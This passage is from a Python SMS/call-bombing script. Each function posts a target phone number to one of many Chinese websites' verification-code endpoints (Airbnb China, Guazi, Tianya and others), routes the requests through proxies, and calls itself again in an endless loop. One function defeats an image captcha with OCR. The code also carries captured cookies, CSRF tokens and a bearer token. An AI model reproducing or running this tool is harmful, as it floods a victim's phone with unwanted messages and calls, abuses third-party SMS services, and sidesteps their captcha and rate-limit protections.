            'cookie': 'Hm_lvt_a96914087b350d1aa86c96cdbf56d5e5=1543636106; Hm_lpvt_a96914087b350d1aa86c96cdbf56d5e5=1543636106; href=https%3A%2F%2Fwww.yunzhijia.com%2Fhome%2Fexpand%3FsingleFeature%3DfreeTalk%26utm_source%3Dbaidu%26utm_medium%3Db18071207067; accessId=ce3d5ef0-6836-11e6-85a2-2d5b0666fd02; pageViewNum=1; bad_idce3d5ef0-6836-11e6-85a2-2d5b0666fd02=f5995931-f51b-11e8-830d-99f566007974; nice_idce3d5ef0-6836-11e6-85a2-2d5b0666fd02=f5995932-f51b-11e8-830d-99f566007974; openChatce3d5ef0-6836-11e6-85a2-2d5b0666fd02=true; parent_qimo_sid_ce3d5ef0-6836-11e6-85a2-2d5b0666fd02=d4ab5dd0-f51c-11e8-b609-854baa0502d0',
            'origin': 'https://www.yunzhijia.com',
            'referer': 'https://www.yunzhijia.com/home/expand?singleFeature=freeTalk&utm_source=baidu&utm_medium=b18071207067',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
            }
        response = requests.post(url,data=data,headers=headers,proxies=proxies)
        print('【fun13】')
        print(response.text)
        time.sleep(step)
        fun13(step,phone,proxies)

def fun14(step,phone,proxies):#云信留客@短信(http://www.winnerlook.com/apply.html)
        url='http://www.winnerlook.com/Apply/GetVerificationCode'
        data={
             'ApplyPhone':phone
             }
        headers={
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Content-Length': '22',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie': 'Hm_lvt_f97cc0c4e5ad670e660b8b430ba0d2aa=1543743352; Hm_lpvt_f97cc0c4e5ad670e660b8b430ba0d2aa=1543743352; Hm_lvt_38fc18cb36b8cb163c6b2f3f278bc79f=1543743352; Hm_lpvt_38fc18cb36b8cb163c6b2f3f278bc79f=1543743352',
            'Host': 'www.winnerlook.com',
            'Origin': 'http://www.winnerlook.com',
            'Referer': 'http://www.winnerlook.com/apply.html',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
            }
        response = requests.post(url,data=data,headers=headers,proxies=proxies)
        print('【fun14】')
        print(response.text)
        time.sleep(step)
        fun14(step,phone,proxies)

#【验证码】
def fun15(step,phone):#天涯社区@电话(https://passport.tianya.cn/register/default.jsp?sourceURL=http%3A%2F%2Fbbs.tianya.cn%2Fpost-free-5995289-1.shtml)
        url='https://passport.tianya.cn/register/sendSmsCode.do?mobile=17740153798&userName=&token=b27d71194b20f88fe07cb1c447d97cb7&__sid=0%231%231.0%2340a74031-82ae-439d-a54c-d833c712df78'
        data={
             'ApplyPhone':phone
             }
        headers={
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Cookie': '__auc=48e4b85016675309f2f6e8981a7; __guid=567582946; __guid2=567582946; ADVC=36b84365bd88ba; __asc=5eb9d55c1676e3ef4546995c7fd; Hm_lvt_bc5755e0609123f78d0e816bf7dee255=1543742879; Hm_lpvt_bc5755e0609123f78d0e816bf7dee255=1543742879; ASL=17867,000az,df66003edf6611c3; tianya1=125629,1543742885,1,86400; ADVS=36d8427ef23259; __cid=CN; bc_ids_m=h8; __ptime=1543742886590; time=ct=1543742891.64; __u_a=v2.2.0; vk=9c2d23b8835e4ceb',
            'Host': 'passport.tianya.cn',
            'Referer': 'https://passport.tianya.cn/register/default.jsp?sourceURL=http%3A%2F%2Fbbs.tianya.cn%2Fpost-free-5995289-1.shtml',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
            }
        response = requests.get(url,data=data,headers=headers)
        print('【fun15】')
        print(response.text)
        time.sleep(step)
        fun15(step,phone)

def fun16(step,phone,proxies):#快商通@短信(https://talk.kuaishangkf.com/#/register/captcha?kat=2)
        url='https://api.kuaishangkf.com/api/register/teleCaptcha'
        data='{"telephone":"'+phone+'"}'
        headers={
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Content-Length': '27',
            'Content-Type': 'application/json;charset=UTF-8',
            'Host': 'api.kuaishangkf.com',
            'Kst-Web-Kf': 'true',
            'Origin': 'https://talk.kuaishangkf.com',
            'Referer': 'https://talk.kuaishangkf.com/',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'
            }
        response = requests.post(url,data=data,headers=headers,proxies=proxies)
        print('【fun16】')
        print(response.text)
        time.sleep(step)
        fun16(step,phone,proxies) 

def fun17(step,phone,proxies):#小溪云@短信(http://route.xiaoxicloud.com:8080/brook-smsplat/web/index-user.html#/signup)
        url='http://route.xiaoxicloud.com:8080/brook-smsplat/verification.code?mobile=17740153798'
        data={
            'mobile':phone
            }
        headers={
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Authorization': 'Bearer',
            'Connection': 'keep-alive',
            'Host': 'route.xiaoxicloud.com:8080',
            'Referer': 'http://route.xiaoxicloud.com:8080/brook-smsplat/web/index-user.html',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'
            }
        response = requests.get(url,data=data,headers=headers,proxies=proxies)
        print('【fun17】')
        print(response.text)
        time.sleep(step)
        fun17(step,phone,proxies)

def fun18(step,phone):#聚通达@电话(http://yunpaas.jvtd.cn/mfty.html)
        url='http://lxbjs.baidu.com/float/xCode?vtel=17740153798&siteid=9516429&bdcbid=45f713f3-0b9b-4241-9be4-98cb394838cf&refer_domain=www.yunpaas.cn&t=1543758424953&callback=_lxb_jsonp_jp6xwo6x_'
        data={
            'vtel': phone,
            'siteid': '9516429',
            'bdcbid': '45f713f3-0b9b-4241-9be4-98cb394838cf',
            'refer_domain': 'www.yunpaas.cn',
            't': '1543758424953',
            'callback': '_lxb_jsonp_jp6xwo6x_'
            }
        headers={
            'Referer': 'http://yunpaas.jvtd.cn/mfty.html',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'
            }
        response = requests.get(url,data=data,headers=headers)
        print('【fun18】')
        print(response.text)
        time.sleep(step)
        fun18(step,phone) 

def fun19(step,phone,proxies):#聚通达@短信(http://yunpaas.jvtd.cn/mfty.html)
        url='http://yunpaas.jvtd.cn/site/mftyinfo.html'
        data={
            'tel': phone
            }
        headers={
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Content-Length': '15',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie': 'LXB_REFER=www.yunpaas.cn; Hm_lvt_df00213b49c7db02e291a5e08cd8c5d5=1543757584; Hm_lpvt_df00213b49c7db02e291a5e08cd8c5d5=1543757584; 53gid2=10573625576008; visitor_type=new; 53gid0=10573625576008; 53gid1=10573625576008; 53revisit=1543757583991; 53kf_72173165_from_host=yunpaas.jvtd.cn; 53kf_72173165_keyword=http%3A%2F%2Fwww.yunpaas.cn%2F; 53kf_72173165_land_page=http%253A%252F%252Fyunpaas.jvtd.cn%252Fmfty.html; kf_72173165_land_page_ok=1; 53uvid=1; onliner_zdfq72173165=0; invite_53kf_totalnum_1=7; my_acc_reauto_time=1543759654959',
            'Host': 'yunpaas.jvtd.cn',
            'Origin': 'http://yunpaas.jvtd.cn',
            'Referer': 'http://yunpaas.jvtd.cn/mfty.html',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
            }
        response = requests.get(url,data=data,headers=headers,proxies=proxies)
        print('【fun19】')
        print(response.text)
        time.sleep(step)
        fun19(step,phone,proxies)
        
def fun20(step,phone):#多维云通讯@短信(http://www.dowei.net/bief.html)
        url='http://www.dowei.net/CustomerExperience/ASP/Code.asp?nocache=0.11081812547698822'
        data={
            'nocache': '0.91081012543491022'
            }
        headers={
            'Accept': 'image/webp,image/apng,image/*,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Cookie': 'KeyWord=%E6%9C%AA%E7%9F%A5; RegistType=%E8%87%AA%E7%84%B6%E6%8E%92%E5%90%8D; ClientType=PC; CustomerID=312484182; HrefSource=%E7%99%BE%E5%BA%A6; ASPSESSIONIDSABDARBD=ODBCAKCBPMDDOHPIADANBCJJ; Hm_lvt_595f8e76ad900ed31a4892d3ffe4e2f5=1544277409; Hm_lpvt_595f8e76ad900ed31a4892d3ffe4e2f5=1544277409; Hm_lvt_2dcb638d71ca8b2be1544cbc55ead58e=1544277409; Hm_lpvt_2dcb638d71ca8b2be1544cbc55ead58e=1544277409; UM_distinctid=1678e1b3da31e7-003f3ef8b533b2-1e3f6654-fa000-1678e1b3da5fd; CNZZDATA5536048=cnzz_eid%3D746052980-1544274324-null%26ntime%3D1544274324; LXB_REFER=www.baidu.com; _qddaz=QD.e5hrxr.xo20xi.jpfiwbbh; _qdda=3-1.22xt5g; _qddab=3-l9nl2f.jpfiwbbk; _jzqa=1.4317621867791348700.1544277410.1544277410.1544277410.1; _jzqc=1; _jzqy=1.1544277410.1544277410.1.jzqsr=baidu.-; _jzqckmp=1; _qzja=1.401632625.1544277409783.1544277409783.1544277409783.1544277409783.1544277409783.0.0.0.1.1; _qzjc=1; _qzjto=1.1.0; _qddamta_4006009160=3-0; _jzqb=1.1.10.1544277410.1; _qzjb=1.1544277409783.1.0.0.0; tencentSig=2790724608; nb-referrer-hostname=www.dowei.net; nb-start-page-url=http%3A%2F%2Fwww.dowei.net%2Fbief.html',
            'Host': 'www.dowei.net',
            'Referer': 'http://www.dowei.net/CustomerExperience/House.html',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'
            }
        
        response = requests.get(url,data=data,headers=headers)
        imageGIF = Image.open(BytesIO(response.content))
        imageGIF.save("fun20.png","png")
        imagePNG=Image.open("fun20.png")
        #imagePNG.show()
        code = pytesseract.image_to_string(imagePNG,lang='dfm')
        print(code)
        url='http://www.dowei.net/CustomerExperience/ASP/Action.asp'
        data={
            'action': 'Message',
            'mobile': phone,
            'Code': code
            }
        response = requests.get(url,data=data,headers=headers)
        print(response.text)
        time.sleep(step)
        #fun20(step,phone)
        '''
        i=0
        while i<100:
            i=i+1
            response = requests.get(url,data=data,headers=headers)
            imageGIF = Image.open(BytesIO(response.content))
            imageGIF.save('img/'+str(i)+'.png','png')
         '''

def fun21(step,phone,proxies):#饿了吗@短信(https://h5.ele.me/login/#redirect=https%3A%2F%2Fwww.ele.me%2F)
        url='https://iask.sina.com.cn/cas-api/sendSms?terminal=PC&businessSys=iask&nationCode=86&mobile=17740153798&businessCode=4'
        data={
            '{"mobile":"'+phone+'","captcha_value":"","captcha_hash":""}'
            }
        headers={
            'authority': 'h5.ele.me',
            'method': 'POST',
            'path': '/restapi/eus/login/mobile_send_code',
            'scheme': 'https',
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'content-length': '61',
            'content-type': 'application/json; charset=utf-8',
            'cookie': 'ubt_ssid=jm7j3qtlnmgbzs7d3gvwck1gpazkceo5_2018-12-09; _utrace=73320d9f4767411c098f07548cb385be_2018-12-09; perf_ssid=zlo4xc3w44hvkqyejuofzwj9fyfqvied_2018-12-09; cna=7Dw2EHo18ncCAXt3QV2iuAGc; isg=BKys_RK83HI0vchOg3r5QuD5fYwezVEIHrP2ggbtQtf6EUgbLHSGnyfHNNmp-Ihn',
            'origin': 'https://h5.ele.me',
            'referer': 'https://h5.ele.me/login/',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
            }
        response = requests.post(url,data=data,headers=headers,proxies=proxies)
        print('【fun21】')
        print(response.text)
        time.sleep(step)
        fun21(step,phone,proxies)

def fun22(step,phone,proxies):#爱彼迎@短信(https://www.airbnb.cn/?af=15514385&c=.pi9.pkbaidu_kwid2885229&src=baidu&medium=ppc&network=1&kw=13529978220&ad=26179752778&mt=1&ap=cl2&ag_kwid=2299-1-7497b8621dbcf72c.06c8608e92b80568&clp_bucket=m)
        url='https://www.airbnb.cn/users/send_mobile_confirmation_code'
        data={
            'phone_number': '86CN'+phone
            }
        headers={
            'authority': 'www.airbnb.cn',
            'method': 'POST',
            'path': '/users/send_mobile_confirmation_code',
            'scheme': 'https',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-length': '28',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'cookie': 'a46dc25ab=long_upsell; 856568311=control; 2997c5695=control; 97414297a=treatment; e31f6c6a7=explore_tab; 39713b081=control; 42e5dcc4f=treatment; bev=1545887055_xeb3au69gAl9Po5n; sdid=; ftv=1545887055569; affiliate=15514385; campaign=.pi9.pkbaidu_kwid2885229; _user_attributes=%7B%22curr%22%3A%22CNY%22%2C%22guest_exchange%22%3A6.891305%2C%22device_profiling_session_id%22%3A%221545887015--3aacc0d0411dfd6040062d45%22%2C%22giftcard_profiling_session_id%22%3A%221545887015--db6cd363c1e676b3ecb07ae8%22%2C%22reservation_profiling_session_id%22%3A%221545887015--b5bfc39dd5ece59d99603ceb%22%7D; flags=0; _airbed_session_id=dedc3f534dd1b625cfd25bbd2355869d; ag_fid=grkJxj7sEe9ce2WF; __ag_cm_=1; _csrf_token=V4%24.airbnb.cn%24BFFBRqO9kYM%24eU2DgDav25Gi324F9MDPPyjPJLPyd9Xp3bPNR1z6x1A%3D; affiliate_referral_at=1545887017; last_aacb=%7B%22af%22%3A%2215514385%22%2C%22c%22%3A%22.pi9.pkbaidu_kwid2885229%22%2C%22timestamp%22%3A1545887017%2C%22ag_kwid%22%3A%222299-1-7497b8621dbcf72c.06c8608e92b80568%22%7D; geetest_data=%7B%22success%22%3A1%2C%22gt%22%3A%227135a67a0d4a85b217ec9a4c6f8290aa%22%2C%22challenge%22%3A%22ab048482c2c454012c0ea6905c9d676f%22%2C%22new_captcha%22%3Atrue%7D; cbkp=1; jitney_client_session_created_at=1545961775; jitney_client_session_updated_at=1545961775; jitney_client_session_id=1c2c6e4a-5af4-4cc0-97be-4fcd522dda64',
            'origin': 'https://www.airbnb.cn',
            'referer': 'https://www.airbnb.cn/?af=15514385&c=.pi9.pkbaidu_kwid2885229&src=baidu&medium=ppc&network=1&kw=13529978220&ad=26179752778&mt=1&ap=cl2&ag_kwid=2299-1-7497b8621dbcf72c.06c8608e92b80568&clp_bucket=m',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
            'x-csrf-token': 'V4$.airbnb.cn$BFFBRqO9kYM$eU2DgDav25Gi324F9MDPPyjPJLPyd9Xp3bPNR1z6x1A=',
            'x-requested-with': 'XMLHttpRequest'
            }
        response = requests.post(url,data=data,headers=headers,proxies=proxies)
        print('【fun22】')
        print(response.text)
        time.sleep(step)
        fun22(step,phone,proxies)

def fun23(step,phone,proxies):#瓜子二手车@短信(https://www.guazi.com/bj/?ca_s=sem_baiduss&ca_n=bdpc_sye&ca_keywordid=89596939214&ca_term=%E9%87%8E%E9%A9%ACgt500&bd_vid=8407066477229897321&ca_transid=8407066477229897321)
        url='https://api.growingio.com/v2/bf5e6f1c1bf9a992/web/action?stm=1546003854248'
        timeStamp =int(time.time()*1000)
        data={
            'stm':timeStamp 
            }
        headers={
            'Origin': 'https://www.guazi.com',
            'Referer': 'https://www.guazi.com/bj/?ca_s=sem_baiduss&ca_n=bdpc_sye&ca_keywordid=89596939214&ca_term=%E9%87%8E%E9%A9%ACgt500&bd_vid=8407066477229897321&ca_transid=8407066477229897321',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'
            }
        response = requests.post(url,data=data,headers=headers,proxies=proxies)
        time.sleep(0.1)
        #print(str(timeStamp))
        url='https://www.guazi.com/zq_user/?act=register'
        data={
            'phone': phone,
            'time': '1545887206',
            'token': '0bcd37f2e474986aa27c918cb3067aec'
            }
        headers={
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Content-Length': '72',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie':'cityDomain=bj; uuid=bf572405-1682-4a50-a6b2-0d48b9f0a654; antipas=i891817717F1M44w484l11O5030v35; clueSourceCode=%2A%2300; ganji_uuid=7240845612395728238506; sessionid=079187c7-8bf0-44db-9ef9-da9beaa2d638; gr_user_id=502a015b-0b93-4be0-a801-cb46567dbbf5; preTime=%7B%22last%22%3A1545963076%2C%22this%22%3A1545887207%2C%22pre%22%3A1545887207%7D; cainfo=%7B%22ca_s%22%3A%22sem_baiduss%22%2C%22ca_n%22%3A%22bdpc_sye%22%2C%22ca_i%22%3A%22-%22%2C%22ca_medium%22%3A%22-%22%2C%22ca_term%22%3A%22%25E9%2587%258E%25E9%25A9%25ACgt500%22%2C%22ca_content%22%3A%22-%22%2C%22ca_campaign%22%3A%22-%22%2C%22ca_kw%22%3A%22-%22%2C%22keyword%22%3A%22-%22%2C%22ca_keywordid%22%3A%2289596939214%22%2C%22scode%22%3A%22-%22%2C%22ca_transid%22%3A%228407066477229897321%22%2C%22platform%22%3A%221%22%2C%22version%22%3A1%2C%22ca_b%22%3A%22-%22%2C%22ca_a%22%3A%22-%22%2C%22display_finance_flag%22%3A%22-%22%2C%22client_ab%22%3A%22-%22%2C%22guid%22%3A%22bf572405-1682-4a50-a6b2-0d48b9f0a654%22%2C%22sessionid%22%3A%22079187c7-8bf0-44db-9ef9-da9beaa2d638%22%7D; close_finance_popup=2018-12-28; gr_session_id_bf5e6f1c1bf9a992=1e3e6173-fc20-49ed-bb38-96471fe79d69; gr_session_id_bf5e6f1c1bf9a992_1e3e6173-fc20-49ed-bb38-96471fe79d69=false',
            'Host': 'www.guazi.com',
            'Origin': 'https://www.guazi.com',
            'Referer': 'https://www.guazi.com/bj/?ca_s=sem_baiduss&ca_n=bdpc_sye&ca_keywordid=89596939214&ca_term=%E9%87%8E%E9%A9%ACgt500&bd_vid=8407066477229897321&ca_transid=8407066477229897321',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
            }
        response = requests.post(url,data=data,headers=headers,proxies=proxies)
        print('【fun23】')
        print(response.text)
        time.sleep(step)
        fun23(step,phone,proxies)

def fun24(step,phone,proxies):#e-office@短信(http://www.e-office.cn/?s=2&w=qyxt-pc-032)
        timeStamp =int(time.time()*1000)
        url='http://www.e-office.cn/oa/get/sms/random'
        data={
            }
        headers={
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Cookie': "Qs_lvt_158486=1545888459; Qs_pv_158486=500921468563537200; Hm_lvt_c7f95947150e37ec6d2c4120a0391deb=1545888460; Hm_lpvt_c7f95947150e37ec6d2c4120a0391deb=1545888460; mediav=%7B%22eid%22%3A%22394839%22%2C%22ep%22%3A%22%22%2C%22vid%22%3A%22Eb3m%3A%2FTH'8%3AC*%3FM%3DI%3A-t%22%2C%22ctn%22%3A%22%22%7D",
            'Host': 'www.e-office.cn',
            'Referer': 'http://www.e-office.cn/?s=2&w=qyxt-pc-032',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
            }
        response = requests.get(url,data=data,headers=headers,proxies=proxies)
        json_text=response.text
        #print(json_text)
        m1=json.loads(json_text)['m1']
        m2=json.loads(json_text)['m2']
        #print(m1)
        #print(m2)
        url='http://live.weaver.com.cn/homepage/createCode2?jsonpcallback=jQuery112206480338718631529_1545888460291&phonenum=17740153798&vcode=010101&time=2018-12-28&m1=5c262c8194c70&m2=b501b1cce28d4bbe3df1fa4bdef5eaf5&_=1545888460293'
        headers={
            'Referer': 'http://www.e-office.cn/?s=2&w=qyxt-pc-032',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'
            }
        timeStr=time.strftime("%Y-%m-%d", time.localtime())
        data={
            'jsonpcallback': 'jQuery112206480338718631529_1545888460291',
            'phonenum': phone,
            'vcode': '010101',
            'time': timeStr,
            'm1': m1,
            'm2': m2,
            '_': str(timeStamp)
            }
        response = requests.get(url,data=data,headers=headers,proxies=proxies)
        print('【fun24】')
        print(response.text)
        time.sleep(step)
        fun24(step,phone,proxies)

def fun25(step,phone,proxies):#伴游天下@短信(http://www.bytrip.com/Index/Index/register.html)
        url='http://www.bytrip.com/User/Public/sendcode.html?mobile=17740153798&type=1'
        data={
            'mobile': phone,
            'type': '1'
            }
        headers={
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Cookie': 'Secure; _qddaz=QD.c2k609.8fyllq.jq66e1lu; _qddab=3-5ibs3q.jq66e1ly; tencentSig=9525757952; PHPSESSID=p5prnd3tc8sifc6kgcv1i90bn4; Secure',
            'Host': 'www.bytrip.com',
            'Referer': 'http://www.bytrip.com/Index/Index/register.html',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            }
        response = requests.get(url,data=data,headers=headers,proxies=proxies)
        print('【fun25】')
        print(response.text)
        time.sleep(step)
        fun25(step,phone,proxies)

def fun26(step,phone,proxies):#美克美家@短信(http://new.markorhome.com/register.html)
        url='http://openapi.markor.humming-tech.com/cgi'
        data='{"cmd":"user/register/getVerificationCode","parameters":{"phone":"'+phone+'","captchaCode":null},"clientIdentifierCode":"b69e8d9d-8df2-045b-d12d-5fe152cb6bd4","token":null}'      
        headers={
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/json',
            'Origin': 'http://new.markorhome.com',
            'Referer': 'http://new.markorhome.com/register.html',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'
            }
        response = requests.post(url,data=data,headers=headers,proxies=proxies)
        print('【fun26】')
        print(response.text)
        time.sleep(step)
        fun26(step,phone,proxies)

def fun27(step,phone,proxies):#美克美家@短信(https://account.flnet.com/sso/register?redirect_url=https%3A%2F%2Fwww.flnet.com%2Findex.php%2Fopenapi%2Fsso%2Flogin%2F&bid=U1NPLTE3MDM4ODgwMDMtNXRxMzViYnBmNzBvdzg4c29zNG9rY3NnMC01OTUzMzc1ZWZiNzRmNzhmMjljYTJkZThlMDIxYjZhYjJkZmRkNTc0YWNmOGIzN2E5MDIyODk2ZGIzYzIzMWJi)
        url='https://account.flnet.com/sms/codes/17740153798'
        data={
            'token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6ImI2ODUzNTUxY2E5ZTVjOWJhNGE1NWFmNjYwYzY3OGQ1OTYyYjhkMDdlOTMyZWQzOGY2Nzg2YzE2NTI3M2UyMTkwZDNhZDI5YmVmYjY5ZmMxIn0.eyJhdWQiOiIxNzAzODg4MDAzIiwianRpIjoiYjY4NTM1NTFjYTllNWM5YmE0YTU1YWY2NjBjNjc4ZDU5NjJiOGQwN2U5MzJlZDM4ZjY3ODZjMTY1MjczZTIxOTBkM2FkMjliZWZiNjlmYzEiLCJpYXQiOjE1NDU4NDg0MDUsIm5iZiI6MTU0NTg0ODQwNSwiZXhwIjoxNTQ4NDQwNDA1LCJzdWIiOiIiLCJzY29wZXMiOltdfQ.WXTVpC-cqyyPjeOFhSrLmk0HT4IAW4yJmbTXJC484zn4gTXTHHyn5FPuX-UbcPdZIOet4ts2M3H4vDpuxSpeLVRAOEboQ_URWV9hq8GUcey5OUGrJY2ijfEgTZLBSh4SEqqDrSMcW5wbtorh0mbqx6BwvQbSyjtSpPYzAaQR8ZSN8skFemKnzREWEx1_avpCLeD1QYQyWSt0GRG5CHeuyRjBFtxiwcVbEGdLAw-DGApCUMdcDs02bqUPeK1aHZHj3P89VmUJUTT8YPopSBMvDUUdLgeUz63aKuSPZ1qpo68i2lQCBx9N7K5Aw3p6VjHpt5Dh1nLvW5kvO8h7uRG0SprSuUadXEW6MwLsBBymLmudezEM8-H24amhiEE16JVYlp-wW5hvKIzWjc0yxr4lQGpJvtmHl9ct0mwxyQbfPWrIt4HSTjeHuPjSbILlJiAvrGFGPAYUklsv2GB7XHaTiv2aMxJ96GQn9Ealt54U1pOfkEe1IM2Qk0qsIf-uQ73StJi3UXmQd0WRAC_ctJykBzALklaHGFb6ohDCjfYeSb5QNtyU9PMGCG0yJqRBDerNiG9z3YhFgW_dBc7fEwZ4EMLulEBUl8UTXuGjiJjR-4xo-mfUOfuBAw8Sf7qiiUB8MB31O0ipE8d8sOjDHBJu23pVZLD8fmi2_djWacjOdhE',
            'mobile': phone,
            'mobile_country_code': '+86',
            'type': '1'
            }
        headers={
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6ImI2ODUzNTUxY2E5ZTVjOWJhNGE1NWFmNjYwYzY3OGQ1OTYyYjhkMDdlOTMyZWQzOGY2Nzg2YzE2NTI3M2UyMTkwZDNhZDI5YmVmYjY5ZmMxIn0.eyJhdWQiOiIxNzAzODg4MDAzIiwianRpIjoiYjY4NTM1NTFjYTllNWM5YmE0YTU1YWY2NjBjNjc4ZDU5NjJiOGQwN2U5MzJlZDM4ZjY3ODZjMTY1MjczZTIxOTBkM2FkMjliZWZiNjlmYzEiLCJpYXQiOjE1NDU4NDg0MDUsIm5iZiI6MTU0NTg0ODQwNSwiZXhwIjoxNTQ4NDQwNDA1LCJzdWIiOiIiLCJzY29wZXMiOltdfQ.WXTVpC-cqyyPjeOFhSrLmk0HT4IAW4yJmbTXJC484zn4gTXTHHyn5FPuX-UbcPdZIOet4ts2M3H4vDpuxSpeLVRAOEboQ_URWV9hq8GUcey5OUGrJY2ijfEgTZLBSh4SEqqDrSMcW5wbtorh0mbqx6BwvQbSyjtSpPYzAaQR8ZSN8skFemKnzREWEx1_avpCLeD1QYQyWSt0GRG5CHeuyRjBFtxiwcVbEGdLAw-DGApCUMdcDs02bqUPeK1aHZHj3P89VmUJUTT8YPopSBMvDUUdLgeUz63aKuSPZ1qpo68i2lQCBx9N7K5Aw3p6VjHpt5Dh1nLvW5kvO8h7uRG0SprSuUadXEW6MwLsBBymLmudezEM8-H24amhiEE16JVYlp-wW5hvKIzWjc0yxr4lQGpJvtmHl9ct0mwxyQbfPWrIt4HSTjeHuPjSbILlJiAvrGFGPAYUklsv2GB7XHaTiv2aMxJ96GQn9Ealt54U1pOfkEe1IM2Qk0qsIf-uQ73StJi3UXmQd0WRAC_ctJykBzALklaHGFb6ohDCjfYeSb5QNtyU9PMGCG0yJqRBDerNiG9z3YhFgW_dBc7fEwZ4EMLulEBUl8UTXuGjiJjR-4xo-mfUOfuBAw8Sf7qiiUB8MB31O0ipE8d8sOjDHBJu23pVZLD8fmi2_djWacjOdhE',
            'Connection': 'keep-alive',
            'Content-Length': '1140',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
